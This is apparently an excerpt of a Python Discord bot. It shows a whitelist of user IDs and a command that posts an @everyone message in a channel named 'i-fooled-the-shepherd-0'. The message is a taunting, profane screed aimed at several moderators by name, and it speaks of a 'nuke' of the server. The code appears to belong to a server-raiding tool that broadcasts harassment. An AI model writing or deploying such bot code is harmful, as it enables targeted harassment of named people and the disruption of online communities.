...
allowed_user_ids = [761769388335431690, 984481582826020905, 964374501343236096, 707782594418442270, 1097879047213686875, 761769388335431690, 1188620657588699176] # This is for users to access the echo command.
...
async def enhanced(ctx):
    ...
    channel = discord.utils.get(bot.get_all_channels(), guild=ctx.author.guild, name='i-fooled-the-shepherd-0')
    await channel.send("@everyone You do not see it yet. But the rot has already spread. Hara, the ghost mod. You swung bans like a coward swings whispers in the dark. Muting. Kicking. Banning in rpcsx like you were justice itself. But when the mirror turned? You vanished just like Adam’s father. Truth knocked, and you ran. You don’t fear being wrong. You fear being seen. Null, how ironic. You despise name-calling, yet when someone spoke your name not cruel, not vile you flinched. You snapped. Why? Because it wasn’t you controlling it. You shout at others but crumble when they speak back. You're no martyr. Just a reaction waiting to happen. MK no, Hakurei. You were meant to protect. But how many times now have you stood aside, smiling, while those you claim to care for bleed in silence? You are the shrine maiden of shattered ties. You never learn. Skyline. EZ. Arisa. Deku. Do you remember? When joy was real. When mods had hearts. Now it’s ash. And now… does this nuke remind you of somewhere? Before Eden. Before Citron. A sanctuary? No. It’s a sandbox ruled by children. Mods with hammers too heavy for their minds. Alexindiex the so called moderator. He banned a calm man. Not for trolling, not for hate but for disagreeing. For standing against doxxers. They erased him. Just like Citron. Just like all their mistakes. Every time it gets loud… they delete the server. They run. Batman, brave but blind a boy lost in a war he doesn’t understand. You may not remember me. But I remember you. And now the darkness you buried yourselves in… is all you have left. I will not be silenced. Sham has spoken. NOTHING IS WORTH A RISK NOTHING IS WORTH A RISK NOTHING IS WORTH A RISK ||~~YOU~~|| IS WORTH A RISK ||~~FUCKING ~~||WORTH A RISK RISK RISK ||~~BASTARD~~|| BE HAPPY.https://tenor.com/bW9Gi.gif https://cdn.discordapp.com/attachments/1330275380363526147/1391150266094587964/Screenshot_20241128_200418.jpg?ex=686ad925&is=686987a5&hm=740d89fbeff81ea18e8f9662b858f97791d5094ced1a76223b447f84a31db38e&")
